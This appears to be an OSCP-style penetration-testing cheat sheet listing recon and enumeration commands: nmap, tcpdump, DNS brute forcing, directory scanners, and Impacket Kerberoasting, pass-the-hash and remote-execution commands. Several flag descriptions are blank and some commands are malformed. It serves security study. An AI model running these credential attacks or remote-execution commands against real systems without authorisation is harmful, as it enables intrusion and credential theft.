<details>
<summary>Recon</summary>

+ <details>
    <summary>Wireshark</summary>
    
    + 
        <br></br>

        <b>Capture Filters: Net Filter</b>

        ```
        net x.x.x.0/24
        ```

        <li><b>net</b>&ensp;--&ensp;Only Capture Traffic on Specified Range</li>
        <br></br>

        <b>Display Filters: FTP Traffic</b>

        ```
        tcp.port == 21
        ```

        <br></br>
    </details>

    <details>
    <summary>Tcpdump</summary>
    
    + 
        <br></br>

        ```
        tcpdump -i eth0
        ```
        
        <li><b>-i</b>&ensp;--&ensp;Interface</li>
        <br></br>
        
        ```
        tcpdump -c -i eth0
        ```
        
        <li><b>-c</b>&ensp;--&ensp;</li>
        <li><b>-i</b>&ensp;--&ensp;Interface</li>
        <br></br>
        
        ```
        tcpdump -A -i eth0
        ```
       
        <li><b>-A</b>&ensp;--&ensp;Print Packets in ASCII</li>
        <li><b>-i</b>&ensp;--&ensp;Interface</li>
        <br></br>
        
        ```
        tcpdump -w 0001.pcap -i eth0
        ```
        
        <li><b>-w</b>&ensp;--&ensp;</li>
        <li><b>-i</b>&ensp;--&ensp;Interface</li>
        <br></br>
       
        ```
        tcpdump -r 0001.pcap
        ```

        <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
        <br></br>

        ```
        tcpdump -n -i eth0
        ```

        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
        <li><b>-i</b>&ensp;--&ensp;Interface</li>
        <br></br>
        
        ```
        tcpdump -i eth0 port 22
        ```

        <li><b>-i</b>&ensp;--&ensp;Interface</li>
        <br></br>
        
        ```
        tcpdump -i eth0 -src x.x.x.x
        ```

        <li><b>-i</b>&ensp;--&ensp;Interface</li>
        <li><b>-src</b>&ensp;--&ensp;Source IP Address</li>
        <br></br>

        ```
        tcpdump -i eth0 -dst x.x.x.x
        ```

        <li><b>-i</b>&ensp;--&ensp;Interface</li>
        <li><b>-dst</b>&ensp;--&ensp;Destination IP address</li>
        <br></br>

        <b>Output Traffic from Given Source Host</b>
        ```
        sudo tcpdump -n src host x.x.x.x -r 0001.pcap
        ```

        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
        <li><b>src host</b>&ensp;--&ensp;Output Given Traffic only from Given Source Host</li>
        <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
        <br></br>

        <b>Output Traffic from Given Destination Host</b>
        ```
        sudo tcpdump -n dst host x.x.x.x -r 0001.pcap
        ```

        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
        <li><b>dst host</b>&ensp;--&ensp;Output Given Traffic only from Given Destination Host</li>
        <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
        <br></br>


        <b>Port # Traffic Only</b>

        ```
        sudo tcpdump -n port 81 -r 0001.pcap
        ```

        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
        <li><b>port</b>&ensp;--&ensp;Output Given Traffic only from Given Port</li>
        <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
        <br></br>


        <b>Dump Captured Traffic</b>
        
        ```
        sudo tcpdump -nX -r 0001.pcap | less
        ```

        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
        <li><b>X</b>&ensp;--&ensp;Print Packet Data in both Hex and ASCII Format</li>
        <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
        <br></br>


        <b>Display Packets with only ACK and PSH Bits Set</b>
        
        ```
        sudo tcpdump -A -n 'tcp[13] = 24' -r 0001.pcap
        ```

        <li><b>-A</b>&ensp;--&ensp;Print Packets in ASCII</li>
        <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Lookup</li>
        <li><b>-r</b>&ensp;--&ensp;Read from Packet Capture</li>
        <li><b>URG</b>&ensp;--&ensp;32</li>
        <li><b>ACK</b>&ensp;--&ensp;16</li>
        <li><b>PSH</b>&ensp;--&ensp;8</li>
        <li><b>RST</b>&ensp;--&ensp;4</li>
        <li><b>SYN</b>&ensp;--&ensp;2</li>
        <li><b>FIN</b>&ensp;--&ensp;1</li>

        <br></br>
        <b>Find all SYN packets</b>
        
        ```
        tcpdump 'tcp[13] & 2 != 0'
        ```
        <b>Find all RST packets</b> 

        ```
        tcpdump 'tcp[13] & 4 != 0'
        ```

        <b>Find all ACK packets</b>
        
        ```
        tcpdump 'tcp[13] & 16 != 0'
        ```
        <br></br>

    </details>

    <details>
    <summary>Network Scanning</summary>

    + <details>
        <summary>NetDiscover (ARP Scanning)</summary>
        
        + 
            <br></br>

            ```
            netdiscover -i eth0
            ```
            
            <li><b>-i</b>&ensp;--&ensp;Interface</li>
            <br></br>
            
            ```
            netdiscover -r x.x.x.0/24
            ```
            
            <li><b>-r</b>&ensp;--&ensp;</li>
            <br></br>
        </details>
            
        <details>
        <summary>nmap (Host Discovery)</summary>
        
        + 
            <br>*Note: Run as sudo to prevent missing host*</br>
            
            ```
            sudo nmap -sn x.x.x.0/24
            ```
            ```
            sudo nmap -sn x.x.x.1-253
            ```
            ```
            sudo nmap -sn x.x.x.*
            ```
            
            <li><b>-sn</b>&ensp;--&ensp;No port scan / Host Discovery Only</li>
            <br></br>
        </details>

        <details>
        <summary>NBTscan</summary>
        
        + 
            <br></br>
            <b>NetBIOS Name Enumeration</b>

            ```
            nbtscan -r x.x.x.0/24
            ```

            <li><b>-r</b>&ensp;--&ensp;Use local port 137 for scans</li>
            <br></br>
        </details>

        <details>
        <summary>Linux Ping Sweep (Bash)</summary>
        
        + 
            <br></br>

            ```
            for i in {1..254} ;do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done
            ```

            <br></br>
        </details>

        <details>
        <summary>Windows Ping Sweep</summary>
        
        + 
            <br></br>

            ```
            for /L %i in (1,1,255) do @ping -n 1 -w 200 x.x.x.%i > nul && echo x.x.x.%i is up.
            ```

            <br></br>
    </details>

    <details>
    <summary>Host Scanning</summary>

    + <details>
        <summary>Nmap</summary>
        
        + 
            <br></br>
            <b>TCP Scans</b>

            ```
            nmap -sC -sV x.x.x.x
            ```

            <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
            <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
            <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
            <br></br>
            
            ```
            nmap -Pn -sC -sV -p- x.x.x.x
            ```
            
            <li><b>-Pn</b>&ensp;--&ensp;Disable Host Discovery</li>
            <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
            <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
            <li><b>-p-</b>&ensp;--&ensp;Scan Ports 1-65535</li>
            <br></br>
            
            ```
            nmap -sV -Pn x.x.x.x
            ```
            
            <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
            <li><b>-Pn</b>&ensp;--&ensp;Disable Host Discovery</li>
            <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
            <br></br>
            
            ```
            nmap -T4 -sC -sV x.x.x.x
            ```
            
            <li><b>-T4</b>&ensp;--&ensp;(-T1) Sneaky, (-T2) Polite,(-T3) Normal, (-T4) Aggressive, (-T5) Insane</li>
            <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
            <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
            <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
            <br></br>
            
            ```
            nmap -A x.x.x.x
            ```
            
            <li><b>-A</b>&ensp;--&ensp;Aggressive Scan Options = (-O)(-sV)(-sC)(--traceroute)</li>
            <li><b>-O</b>&ensp;--&ensp;OS Detection</li>
            <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
            <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
            <li><b>--traceroute</b>&ensp;--&ensp;Traceroute</li>
            <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
            <br></br>
            
            <b>Stealth/SYN Scans</b>

            ```
            nmap -sS -sC -sV x.x.x.x
            ```
            
            <li><b>-sS</b>&ensp;--&ensp;TCP SYN Scan | Stealth Scan</li>
            <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
            <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
            <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
            <br></br>
            
            ```
            nmap -sS -p- x.x.x.x
            ```
            
            <li><b>-sS</b>&ensp;--&ensp;TCP SYN Scan | Stealth Scan</li>
            <li><b>-p-</b>&ensp;--&ensp;Scan Ports 1-65535</li>
            <br></br>
            
            <b>UDP Scans</b>

            ```
            sudo nmap -sS -sU -Pn -sV x.x.x.x
            ```
            
            <li><b>-sS</b>&ensp;--&ensp;TCP SYN Scan | Stealth Scan</li>
            <li><b>-sU</b>&ensp;--&ensp;UDP Scan</li>
            <li><b>-Pn</b>&ensp;--&ensp;Disable Host Discovery</li>
            <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
            <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
            <br></br>
            
            ```
            sudo nmap -sU -A --top-ports=20 --version-all
            ```
            
            <li><b>-sU</b>&ensp;--&ensp;UDP Scan</li>
            <li><b>-A</b>&ensp;--&ensp;Aggressive Scan Options = (-O)(-sV)(-sC)(--traceroute)</li>
            <li><b>-O</b>&ensp;--&ensp;OS Detection</li>
            <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
            <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
            <li><b>--traceroute</b>&ensp;--&ensp;Traceroute</li>
            <li><b>--top-ports=</b>&ensp;--&ensp;Scan # Most Common Ports</li>
            <li><b>--version-all</b>&ensp;--&ensp;Try Every Single Probe (intensity 9)</li>
            <br></br>
            
            ```
            sudo nmap -sU -A -p 53,67,68,161,162 --version-all
            ```
            <li><b>-sU</b>&ensp;--&ensp;UDP Scan</li>
            <li><b>-A</b>&ensp;--&ensp;Aggressive Scan Options = (-O)(-sV)(-sC)(--traceroute)</li>
            <li><b>-O</b>&ensp;--&ensp;OS Detection</li>
            <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
            <li><b>-sC</b>&ensp;--&ensp;Script Scanning</li>
            <li><b>--traceroute</b>&ensp;--&ensp;Traceroute</li>
            <li><b>-p</b>&ensp;--&ensp;Scan Ports Entered</li>
            <li><b>--version-all</b>&ensp;--&ensp;Try Every Single Probe (intensity 9)</li>
            <br></br>

            <b>TCP Connect Scan</b>

            ```
            nmap -sT x.x.x.x
            ```
            
            <li><b>-sT</b>&ensp;--&ensp;TCP connect scan</li>
            <li><b>No Port Listed</b>&ensp;--&ensp;Scans the 1000 most popular ports</li>
            <br></br>
            <b>Scans through Socks proxy</b>

            ```
            nmap --proxies socks4://proxy-ip:8080 target-ip
            ```

            <li><b>--proxies</b>&ensp;--&ensp;Relay Connection Through HTTP/SOCKS4 Proxies</li>
            <br></br>
            <br></br>
            
            <b>Nmap Scripts</b>

            ```
            nmap --scripts vuln,safe,discovery -oN results.txt target-ip
            ```
            
            <li><b>-oN</b>&ensp;--&ensp;Normal Output .nmap</li>
            <li><b>-oX</b>&ensp;--&ensp;XML Output .xml</li>
            <li><b>--scripts</b>&ensp;--&ensp;Runs a Script Scan using the comma-separated list of filenames</li>
            <br></br>
            <b>Nmap Script Location:</b> 
            
            ```
            /usr/share/nmap/scripts/
            ```
            
            <b>Script Description</b>
            
            ```
            nmap --script-help dns-zone-transfer
            ```
            
            <br></br>
            <b>--Script Variations:</b> 
            <li><b>--script "http-*"</b>&ensp;--&ensp;Loads all scripts whose name starts with http-</li>
            <li><b>--script "not intrusive"</b>&ensp;--&ensp;Loads every script except for those in the intrusive category</li>
            <li><b>--script "default or safe"</b>&ensp;--&ensp;Loads all scripts that are in the default category or the safe category or both</li>
            <li><b>--script "default and safe"</b>&ensp;--&ensp;Loads those scripts that are in both the default and safe categories</li>
            <li><b>--script "(default or safe or intrusive) and not http-*"</b>&ensp;--&ensp;Loads scripts in the default, safe, or intrusive categories, except for those whose names start with http-.</li>
            
            <br></br>
        </details>

        <details>
        <summary>Netcat (PortScan)</summary>
        
        + 
            <br></br>
            <b>TCP Netcat Port Scan</b>

            ```
            nc -nvv -w 1 -z x.x.x.x 1-65535
            ```

            <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
            <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>
            <li><b>-w</b>&ensp;--&ensp;Connection Timeout in seconds</li>
            <li><b>-z</b>&ensp;--&ensp;Zero IO Mode (Sends no data)</li>
            <br></br>
            <b>UDP Netcat Port</b>

            ```
            nc -nv -u -w 1 -z x.x.x.x 160-162
            ```

            <li><b>-u</b>&ensp;--&ensp;UDP Scan</li>
            <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
            <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>
            <li><b>-w</b>&ensp;--&ensp;Connection Timeout in seconds</li>
            <li><b>-z</b>&ensp;--&ensp;Zero IO Mode (Sends no data)</li>
            <br></br>
        </details>
        
        <details>
        <summary>Dig</summary>

        + 
            <br></br>

            ```
            dig www.example.com + short
            ```
            
            <li><b>+ short</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            dig www.example.com MX
            ```
            
            <li><b>MX</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            dig www.example.com NS
            ```
            
            <li><b>NS</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            dig www.example.com SOA
            ```
            
            <li><b>SOA</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            dig www.example.com ANY +noall +answer
            ```
            
            <li><b>ANY</b>&ensp;--&ensp;</li>
            <li><b>+noall</b>&ensp;--&ensp;</li>
            <li><b>+answer</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            dig -x www.example.com
            ```
            
            <li><b>-x</b>&ensp;--&ensp;Simplified Reverse Lookups, for Mapping Addresses to Names</li>
            <br></br>
            
            ```
            dig -4 www.example.com
            ```
            
            <li><b>-4</b>&ensp;--&ensp;IPv4</li>
            <br></br>
            
            ```
            dig -6 www.example.com
            ```
            
            <li><b>-6</b>&ensp;--&ensp;IPv6</li>
            <br></br>
            
            ```
            dig www.example.com mx +noall +answer example.com ns +noall +answer
            ```
            
            <li><b>mx</b>&ensp;--&ensp;</li>
            <li><b>+noall</b>&ensp;--&ensp;</li>
            <li><b>+answer</b>&ensp;--&ensp;</li>
            <li><b>ns</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            dig -t AXFR www.example.com
            ```
            <li><b>-t AXFR</b>&ensp;--&ensp;Resource Record Type to Query</li>
            
            <br></br>
            
            <b>Something</b>
            <li><b>AXFR</b>Zone Transfer</li>
            <li><b>IXFR</b>Icremental Zone Transfer</li>
            <br></br>
        </details>

        <details>
        <summary>Host</summary>

        + 
            <br></br>
            <b>Find IP Address of Hostname: Looks for A host record</b>

            ```
            host www.example.com
            ```
            <br></br>
            <b>MX Records: </b>
            
            ```
            host -t mx www.example.com
            ```
            
            <li><b>-t</b>&ensp;--&ensp;type</li>
            <li><b>mx</b>&ensp;--&ensp;Find Servers that Handle Emails for the Domain</li>
            
            <br></br>
            <b>Look for TXT Record</b>
            
            ```
            host -t txt www.example.com
            ```
            
            <li><b>-t</b>&ensp;--&ensp;type</li>
            <li><b>txt</b>&ensp;--&ensp;Contains any type of arbitrary data (worth investigationg)</li>
            
            <br></br>
            <b>Forward Lookup Brute Force</b>

            ```
            for ip in $(hostname.txt); do host $ip.example.com; done | grep -v "NXDOMAIN" | grep "has address"
            ```

            <b>Unique Domains Only</b>

            ```
            for ip in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt); do host $ip.example.com; done | grep -v NXDOMAIN | grep "has address" | cut -d " " -f 1 | uniq -c 

            ```

            <br></br>

            <b>Reverse Lookup Brute Force</b>

            ```
            for ip in $(seq 50 100); do host x.x.x.$ip; done | grep -v "not found"
            ```

            <br></br>
            <b>Look for DNS Server</b>
            
            ```
            host -t ns www.example.com
            ```
            
            <li><b>-t</b>&ensp;--&ensp;type</li>
            <li><b>ns</b>&ensp;--&ensp;DNS Servers</li>

            <br></br>
            <b>Zone Transfer</b>

            ```
            host -l example.com ns1.example.com
            ```

            <li><b>-l</b>&ensp;--&ensp;Zone Transfer</li>

            <br></br>

        </details>

        <details>
        <summary>Amass</summary>

        + 
            <br></br>

            ```
            amass enum -d www.example.com
            ```
            
            <li><b>enum</b>&ensp;--&ensp;</li>
            <li><b>-d</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            amass intel -whois -d www.example.com
            ```
            
            <li><b>intel</b>&ensp;--&ensp;</li>
            <li><b>-whois</b>&ensp;--&ensp;</li>
            <li><b>-d</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            amass intel -active x.x.x.0-64 -p 80,443,8080,8443
            ```
            
            <li><b>intel</b>&ensp;--&ensp;</li>
            <li><b>-active</b>&ensp;--&ensp;</li>
            <li><b>-p</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            amass intel -ipv4 -whois -d www.example.com
            ```
            
            <li><b>intel</b>&ensp;--&ensp;</li>
            <li><b>-ipv4</b>&ensp;--&ensp;</li>
            <li><b>-whois</b>&ensp;--&ensp;</li>
            <li><b>-d</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            amass intel -ipv6 -whois -d www.example.com
            ```
            
            <li><b>intel</b>&ensp;--&ensp;</li>
            <li><b>-ipv6</b>&ensp;--&ensp;</li>
            <li><b>-whois</b>&ensp;--&ensp;</li>
            <li><b>-d</b>&ensp;--&ensp;</li>
            <br></br>
        </details>

        <details>
        <summary>Sublist3r</summary>

        + 
            <br></br>

            ```
            Sublist3r -d www.example.com
            ```
            
            <li><b>-d</b>&ensp;--&ensp;</li>
            <br></br>
            
            ```
            Sublist3r -v -d www.example.com -p 80,443
            ```
            
            <li><b>-v</b>&ensp;--&ensp;</li>
            <li><b>-d</b>&ensp;--&ensp;</li>
            <li><b>-p</b>&ensp;--&ensp;</li>
            <br></br>
        </details>

        <details>
        <summary>DNSrecon</summary>

        + 
            <br></br>

            ```
            dnsrecon -d www.example.com -a
            ```
            
            <li><b>-d</b>&ensp;--&ensp;Domain Name</li>
            <li><b>-a</b>&ensp;--&ensp;Perform AXFR with standard enumeration</li>
            <br></br>
            
            <b>Zone Transfer</b>

            ```
            dnsrecon -d www.example.com -t axfr
            ```
            
            <li><b>-d</b>&ensp;--&ensp;Domain Name</li>
            <li><b>-t</b>&ensp;--&ensp;Enumeration Type</li>
            <br></br>
           
            ```
            dnsrecon -d
           
            ```
            
            <li><b>-d</b>&ensp;--&ensp;Domain Name</li>
            <br></br>

            <b>Brute Force Host Names</b>
            
            ```
            dnsrecon -d www.example.com -D <namelist> -t brt</namelist>
            ```
            
            <li><b>-d</b>&ensp;--&ensp;Domain Name</li>
            <li><b>-D</b>&ensp;--&ensp;Specify Domain Name File List</li>
            <li><b>-t</b>&ensp;--&ensp;Enumeration Type</li>
            
            <br></br>
        </details>

        <details>
        <summary>DNSenum</summary>

        + 
            <br></br>
            <b>Complete DNS Enumeration</b>

            ```
            dnsenum zonetransfer.me
            ```
            
            <br></br>
        </details>

        <details>
        <summary>UnicornScan (UDP)</summary>

        + 
            <br></br>

            ```
            unicornscan -mU -p ,161,162,137,123,138,1434,445,135,67,68,53,139,500,637,162,69
            ```

            <li><b>-mU</b>&ensp;--&ensp;</li>
            <li><b>-p</b>&ensp;--&ensp;</li>
            <br></br>
        </details>
    </details>
</details>

<details>
<summary>Enumeration</summary>

+ <details>
    <summary>Responder (Not Allowed on OSCP)(Empty)</summary>
    
    + 
        <br></br>

        ```
        ```

        <br></br>
        <li><b></b></li>
        <br></br>
    </details>

    <details>
    <summary>Impacket Kerberoasting</summary>
        
    + 
        <br></br>
        <b>Install</b>

        ```
        apt install impacket-scripts
        ```

        <br></br>
        <b>Check for Kerberoasting</b>

        ```
        GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip x.x.x.x -format hashcat/john</ip>
        ```
        
        <li><b>-userfile</b>&ensp;--&ensp;</li>
        <li><b>-dc-ip</b>&ensp;--&ensp;</li>
        <li><b>-format</b>&ensp;--&ensp;</li>
        <br></br>

        <br></br>
        <b>GetUserSPNs: ASREPRoast</b>

        ```
        impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
        ```
        
        <li><b>-request</b>&ensp;--&ensp;</li>
        <li><b>-format</b>&ensp;--&ensp;</li>
        <li><b>-outputfile</b>&ensp;--&ensp;</li>
        <br></br>
        
        
        ```
        impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
        ```
        
        <li><b>-userfile</b>&ensp;--&ensp;</li>
        <li><b>-format</b>&ensp;--&ensp;</li>
        <li><b>-outputfile</b>&ensp;--&ensp;</li>
        <br></br>

        <b>GetUserSPNs: Kerberoasting</b>

        ```
        impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
        ```
        
        <li><b>-outputfile</b>&ensp;--&ensp;</li>
        <br></br>

        <b>GetUserSPNs: Overpass The Hash/Pass The Key (PTK)</b>

        ```
        python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
        ```
        
        <li><b>-hashes</b>&ensp;--&ensp;</li>
        <br></br>
        
        ```
        python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
        ```
        
        <li><b>-aesKey</b>&ensp;--&ensp;</li>
        <br></br>
        
        ```
        python3 getTGT.py <domain_name>/<user_name>:[password]
        ```

        <br></br>
        <b>Using TGT key to excute remote commands from the following impacket scripts:</b>
        
        ```
        python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
        ```
        
        <li><b>-k</b>&ensp;--&ensp;</li>
        <li><b>-no-pass</b>&ensp;--&ensp;</li>
        <br></br>
        
        ```
        python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
        ```
        
        <li><b>-k</b>&ensp;--&ensp;</li>
        <li><b>-no-pass</b>&ensp;--&ensp;</li>
        <br></br>
        
        ```
        python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
        ```
        
        <li><b>-k</b>&ensp;--&ensp;</li>
        <li><b>-no-pass</b>&ensp;--&ensp;</li>
        <br></br>
        
        <b>Github Link</b>

        ```
        https://github.com/SecureAuthCorp/impacket
        ```

        <br>Local Locations:</br>

        ```
        /usr/share/doc/python3-impacket/examples
        ```

        <br></br>
    </details>

    <details>
    <summary>Services</summary>
    
     + <details>
        <summary>Web</summary>
        
        + <details>
            <summary>Tips and Tools</summary>

            + <details>
                <summary>Common Wordlists</summary>

                + 
                    <br></br>
                    <b>Web Directory Enumeration Lists</b>

                    ```
                    /usr/share/wordlists/dirb/common.txt
                    ```
                    ```
                    /usr/share/wordlists/dirbuster/*.txt
                    ```
                    ```
                    /usr/share/wordlists/wfuzz/general/*.txt
                    ```
                    ```
                    /usr/share/seclists/Discovery/Web-Content/
                    ```

                    <br></br>
                    <b>Common User Enumeration Lists</b>

                    ```
                    /usr/share/seclists/Usernames
                    ```
                    ```
                    /usr/share/wordlists/dirbuster/apache-user-enum-2.0
                    ```

                    <br></br>
                </details>
            </details>

            <details>
            <summary>Web App Scanners</summary>

            + <details>
                <summary>Nikto</summary>

                + 
                    <br></br>

                    ```
                    nikto --url
                    ```
                    
                    <li><b>--url</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                </details>

                <details>
                <summary>WPScan</summary>

                + 
                    <br></br>

                    ```
                    wpscan --url
                    ```
                    
                    <li><b>--url</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    wpscan --url --enumerate ap at
                    ```
                    
                    <li><b>--url</b>&ensp;--&ensp;</li>
                    <li><b>--enumerate</b>&ensp;--&ensp;</li>
                    <li><b>ap</b>&ensp;--&ensp;All Plugins</li>
                    <li><b>at</b>&ensp;--&ensp;All Themes</li>
                    <br></br>
                    
                    ```
                    wpscan --url --enumerate u
                    ```
                    
                    <li><b>--url</b>&ensp;--&ensp;</li>
                    <li><b>--enumerate</b>&ensp;--&ensp;</li>
                    <li><b>u</b>&ensp;--&ensp;Usernames</li>
                    <br></br>
                    
                    ```
                    wpscan --url --enumerate v
                    ```
                    
                    <li><b>--url</b>&ensp;--&ensp;</li>
                    <li><b>--enumerate</b>&ensp;--&ensp;</li>
                    <li><b>v</b>&ensp;--&ensp;</li>

                    <br></br>
                </details>

                <details>
                <summary>Dirb</summary>

                + 
                    <br></br>

                    ```
                    dirb http://x.x.x.x -r -z 10
                    ```
                    
                    <li><b>-r</b>&ensp;--&ensp;Scan Non-Recursively</li>
                    <li><b>-z</b>&ensp;--&ensp;Adds # millisecond delay to each request</li>

                    <br></br>
                </details>

                <details>
                <summary>Gobuster</summary>

                + 
                    <br></br>

                    ```
                    gobuster dir -u -w /usr/share/wordlists/
                    ```
                    
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <br></br>
                    
                    ```
                    gobuster dir -u -w /usr/share/wordlists/ a Firefox
                    ```
                    
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>a</b>&ensp;--&ensp;Custom Agent</li>
                    <br></br>
                    
                    ```
                    gobuster dir -u -w /usr/share/wordlists/ -x .php,.txt,.html
                    ```
                    
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
                    <br></br>
                    
                    ```
                    gobuster dir -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200"
                    ```
                    
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
                    <li><b>-s</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    gobuster dir -e -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200"
                    ```
                    
                    <li><b>-e</b>&ensp;--&ensp;</li>
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
                    <li><b>-s</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    gobuster dir -v -e -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200"
                    ```
                    
                    <li><b>-v</b>&ensp;--&ensp;</li>
                    <li><b>-e</b>&ensp;--&ensp;</li>
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
                    <li><b>-s</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    gobuster dir -v -e -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200" -o output.txt
                    ```
                    
                    <li><b>-v</b>&ensp;--&ensp;</li>
                    <li><b>-e</b>&ensp;--&ensp;</li>
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-x</b>&ensp;--&ensp;File Extensions</li>
                    <li><b>-s</b>&ensp;--&ensp;</li>
                    <li><b>-o</b>&ensp;--&ensp;Output</li>
                    <br></br>
                    
                    ```
                    gobuster dir -s 200,204,301,302,307,403 -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
                    ```
                    
                    <li><b>-s</b>&ensp;--&ensp;</li>
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-t</b>&ensp;--&ensp;</li>
                    <li><b>a</b>&ensp;--&ensp;Custom Agent</li>
                    <br></br>
                </details>

                <details>
                <summary>Wfuzz</summary>

                + 
                    <br></br>

                    ```
                    wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ
                    ```
                    
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <br></br>
                    
                    ```
                    wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
                    ```
                    
                    <li><b>-z</b>&ensp;--&ensp;</li>
                    <li><b>--hl</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    <b>Post Request</b>
                    
                    ```
                    wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ" --hc 302 http://testphp.vulnweb.com/userinfo.php
                    ```
                    
                    <li><b>-z</b>&ensp;--&ensp;</li>
                    <li><b>-d</b>&ensp;--&ensp;</li>
                    <li><b>--hc</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    <b>Fuzzing Cookies</b>
                    
                    ```
                    wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testp.vulnweb.com/FUZZ
                    ```
                    
                    <li><b>-z</b>&ensp;--&ensp;</li>
                    <li><b>-b</b>&ensp;--&ensp;</li>
                    <br></br>

                    <br></br>
                </details>

                <details>
                <summary>Dirsearch</summary>

                + 
                    <br></br>

                    ```
                    dirsearch /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u x.x.x.x -e php
                    ```
                    
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-e</b>&ensp;--&ensp;File Extention</li>
                    <br></br>
                </details>
